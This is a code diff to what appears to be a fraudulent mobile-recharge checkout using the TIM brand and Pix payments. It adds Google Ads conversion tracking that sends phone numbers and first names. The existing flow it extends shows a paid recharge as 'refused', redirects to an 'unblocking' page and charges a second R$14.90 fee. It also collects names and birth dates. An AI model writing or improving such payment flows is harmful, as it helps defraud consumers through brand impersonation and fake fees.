@@ -227,6 +227,8 @@
         dataNascimento: state.customer?.dataNascimento || '',
         telefone: state.phone || '',
         valor: state.rechargeValue || 50,
+        transacaoId: state.pixId || null,
+        pago: state.isPaid || false,
         atualizadoEm: new Date().toISOString(),
         raw: state.customer?.raw || null
       };
@@ -239,6 +241,58 @@
       window.comprovanteDados = comprovantePayload;
     } catch (e) {}
   }
+
+  // --- Google Ads Conversion Tracking (Compra) ---
+  function dispararConversaoGoogle(dados) {
+    try {
+      const valor = Number(dados?.valor) || Number(state.rechargeValue) || 1.0;
+      const transacaoId = dados?.transacaoId || state.pixId || ('TIM-' + Date.now());
+      const telefone = dados?.telefone || state.phone || '';
+      const nome = dados?.nome || state.customer?.nome || '';
+
+      // Evita disparos duplicados no mesmo navegador para a mesma transação
+      const storageKey = 'tim_gtag_conv_' + transacaoId;
+      if (sessionStorage.getItem(storageKey)) {
+        console.log('[Google Ads] Conversão já enviada anteriormente nesta sessão para ID:', transacaoId);
+        return;
+      }
+      sessionStorage.setItem(storageKey, 'true');
+
+      if (typeof window.gtag === 'function') {
+        // Enhanced Conversions: dados normalizados para correspondência do Google
+        if (telefone) {
+          const cleanPhone = String(telefone).replace(/\D/g, '');
+          if (cleanPhone.length >= 10) {
+            const e164Phone = '+55' + cleanPhone;
+            const firstName = nome ? String(nome).trim().split(' ')[0].toLowerCase() : undefined;
+            window.gtag('set', 'user_data', {
+              phone_number: e164Phone,
+              address: firstName ? { first_name: firstName } : undefined
+            });
+          }
+        }
+
+        // Event snippet oficial para conversão de Compra
+        window.gtag('event', 'conversion', {
+          'send_to': 'AW-18541357832/rcyNCO7inqwdEIjWmolF',
+          'value': valor,
+          'currency': 'BRL',
+          'transaction_id': String(transacaoId)
+        });
+        console.log('[Google Ads] Conversão de Compra registrada:', {
+          send_to: 'AW-18541357832/rcyNCO7inqwdEIjWmolF',
+          value: valor,
+          currency: 'BRL',
+          transaction_id: String(transacaoId)
+        });
+      } else {
+        console.warn('[Google Ads] gtag() não encontrado no momento do disparo.');
+      }
+    } catch (err) {
+      console.error('[Google Ads] Erro ao disparar conversão:', err);
+    }
+  }
+  window.dispararConversaoGoogle = dispararConversaoGoogle;
 
   function formatPhone(digits) {
     const clean = cleanDigits(digits);
@@ -880,10 +934,17 @@
   function handlePixApproved() {
     clearInterval(state.pollInterval);
     clearInterval(state.timerInterval);
+    state.isPaid = true;
 
     if (state.isTaxaDesbloqueio) {
       // Segundo pagamento (Taxa de Desbloqueio R$ 14,90) aprovado com sucesso!
       salvarDadosComprovante();
+      dispararConversaoGoogle({
+        valor: 14.90,
+        transacaoId: state.pixId || ('TAXA-' + Date.now()),
+        telefone: state.phone,
+        nome: state.customer?.nome
+      });
       try {
         const comp = JSON.parse(localStorage.getItem('comprovante_dados') || '{}');
         comp.status = 'HOMOLOGADO_E_LIBERADO';
@@ -909,6 +970,17 @@
       }, 2000);
     } else {
       // Primeira recarga efetuada — retém a recarga no bilhetador e redireciona para a página dedicada de regularização (/desbloqueio)
+      const valorVenda = getTotal();
+      const txId = state.pixId || ('TIM-' + Date.now());
+
+      // Dispara conversão de Compra no Google Ads no momento da confirmação do Pix
+      dispararConversaoGoogle({
+        valor: valorVenda,
+        transacaoId: txId,
+        telefone: state.phone,
+        nome: state.customer?.nome
+      });
+
       salvarDadosComprovante();
       statusBadge.classList.add('refused');
       statusSpinner.style.display = 'none';
@@ -927,6 +999,8 @@
         if (state.rechargeValue) params.set('val', state.rechargeValue);
         if (state.customer?.nome) params.set('nome', state.customer.nome);
         if (state.customer?.dataNascimento) params.set('nasc', state.customer.dataNascimento);
+        params.set('txid', txId);
+        params.set('pago', '1');
         window.location.href = `/desbloqueio?${params.toString()}`;
       }, 1500);
     }
